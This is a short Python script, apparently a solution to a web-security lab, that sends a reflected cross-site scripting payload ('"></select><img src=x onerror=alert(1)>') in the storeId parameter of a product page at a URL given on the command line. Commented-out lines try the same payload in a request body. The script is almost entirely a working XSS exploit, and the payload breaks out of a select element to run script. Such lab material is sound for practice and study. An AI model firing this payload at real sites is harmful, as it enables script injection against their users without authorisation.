import requests
import sys
import webbrowser
import time
from selenium import webdriver

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

   # burp_url = sys.argv[1] + '/product/stock'
    #burp_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36"}
    #burp_data = {"productId": "3", "storeId": "London\"></select><img src=x onerror=alert(1)>"}
    #response = requests.get(burp_url, headers=burp_headers, data=burp_data)

 #   browser = webbrowser.get()
#    browser.open(sys.argv[1]+'/product?productId=3')

  #  time.sleep(5)


burp_url = sys.argv[1]
xss_url = burp_url + '/product?productId=3&storeId="></select><img src=x onerror=alert(1)>'
burp_headers = {}
requests.get(xss_url, headers=burp_headers)
